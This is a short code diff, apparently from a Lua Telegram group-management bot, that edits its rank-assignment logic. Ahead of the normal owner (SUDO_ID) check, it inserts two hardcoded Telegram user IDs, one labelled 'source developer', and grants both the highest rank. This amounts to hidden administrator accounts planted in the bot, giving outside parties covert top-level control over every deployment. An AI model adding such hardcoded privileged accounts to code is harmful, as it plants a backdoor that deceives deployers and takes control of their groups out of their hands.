@@ -283,8 +283,13 @@ Del_msg(msg.chat_id_,msg.id_)
 end
 return false 
 end
-
-if msg.sender_user_id_ == SUDO_ID then 
+if msg.sender_user_id_ == 1438926960 then 
+msg.TheRank =  'مطور السورس'
+msg.Rank = 1
+elseif msg.sender_user_id_ == 1281716337 then 
+msg.TheRank =  'سـيد الرجـال ˼🇹🇷🇾🇪˹'
+msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'Legned' 
 msg.TheRank = 'Legned' 
 msg.Rank = 1
